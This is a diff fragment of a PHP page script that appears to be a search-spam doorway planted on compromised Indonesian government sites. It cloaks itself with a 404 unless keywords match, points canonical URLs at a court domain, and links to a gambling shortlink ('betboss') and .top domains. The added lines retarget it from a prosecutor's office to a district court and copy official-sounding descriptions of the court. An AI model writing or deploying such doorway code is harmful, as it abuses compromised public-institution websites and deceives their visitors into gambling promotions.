@@ -43,15 +43,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://needmariju.top/page/?google=$dashbrand";
-$canonical = "https://kejari-lampungtimur.kejaksaan.go.id/vendor/$dashbrand";
+$amphtml = "https://galalasho.top/id/?google=$dashbrand";
+$canonical = "https://pn-manado.go.id/absen/$dashbrand";
 $cta = "https://t.ly/betboss";
-$gambar = "https://res.cloudinary.com/dt3xlwq3j/image/upload/v1728309672/OIG2.SHddNCMkSiEHHR_xDuFH_no0lyu.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729082466/OIG4.z2HeES2VBEkwHXl5RBCl_bcgnyj.jpg";
 $price = "5000.00";
 
-$judul = "Layanan Pemenuhan Undangan Rapat $namabrand";
-$desc = "Lembaga yang menangani segala kasus merupakan kejaksaan dengan adanya platform layanan permohonan untuk masyarakat yang ingin mendapatkan haknya bisa langsung datang ke kantor atau online di $namabrand untuk mendapatkan undangan agar bisa masuk dan mengantri dengan tujuan memiliki hak dan keamanan yang sama.";
-$konten = "Lembaga yang menangani segala kasus merupakan kejaksaan dengan adanya platform layanan permohonan untuk masyarakat yang ingin mendapatkan haknya bisa langsung datang ke kantor atau online di $namabrand untuk mendapatkan undangan agar bisa masuk dan mengantri dengan tujuan memiliki hak dan keamanan yang sama.";
+$judul = "$namabrand Link Absen Pengadilan Negeri Manado";
+$desc = "Pengadilan Negeri Manado adalah lembaga peradilan yang berada di bawah naungan Mahkamah Agung Republik Indonesia dan memiliki yurisdiksi di wilayah Kota Manado, Sulawesi Utara. Sebagai bagian dari sistem peradilan umum di $namabrand, Pengadilan Negeri Manado berperan dalam menangani berbagai perkara perdata, pidana, dan sengketa tata usaha negara di tingkat pertama.";
+$konten = "Pengadilan Negeri Manado adalah lembaga peradilan yang berada di bawah naungan Mahkamah Agung Republik Indonesia dan memiliki yurisdiksi di wilayah Kota Manado, Sulawesi Utara. Sebagai bagian dari sistem peradilan umum di $namabrand, Pengadilan Negeri Manado berperan dalam menangani berbagai perkara perdata, pidana, dan sengketa tata usaha negara di tingkat pertama.";
 ?>
 
 
